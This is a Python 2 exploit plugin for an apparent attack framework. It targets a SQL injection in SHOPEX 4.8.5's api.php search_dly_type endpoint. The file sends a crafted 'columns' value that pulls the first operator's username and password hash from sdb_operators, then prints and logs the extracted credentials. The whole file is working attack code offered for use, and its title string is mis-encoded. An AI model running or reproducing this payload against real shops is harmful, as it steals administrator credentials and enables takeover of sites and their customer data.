# -*- coding: utf-8 -*-
class mstplugin:
    infos = [
        ['Plugin','SHOPEX 4.8.5 SQL×¢ÈëExploit'],
        ['Author','mst'],
        ['Update','2013/10/22'],
        ['site','http://mstoor.duapp.com'],
        ]
    opts  = [
        ['URL','localhost','Url'],
        ['PATH','/shopex/','Cms path'],
        ['PORT','80','port']
        ]
    def exploit(self):
        url   = fuck.urlformate(URL,PORT,PATH)+"api.php?act=search_dly_type&api_version=1.0"
        poc   = '1,2,(SELECT concat(username,0x7c,userpass) FROM sdb_operators limit 0,1) as name'
        value = {"columns":poc}
        try:
            color.cprint("[+] Sending exp ..",YELLOW)
            res= fuck.urlpost(url,value)
            ok = fuck.find(r'\w+[|]+\w+',res.read())[0]
            if len(ok)>0:
                color.cprint("[*] Exploit Successful !\n[*] %s"%ok,GREEN)
                fuck.writelog("shopex_4.8.5_api_php_sqli",URL+"::"+ok)
            else:
                color.cprint("[!] Exploit False !",RED)
        except Exception,e:
            color.cprint("[!] ERR! CODE:%s"%e,RED)
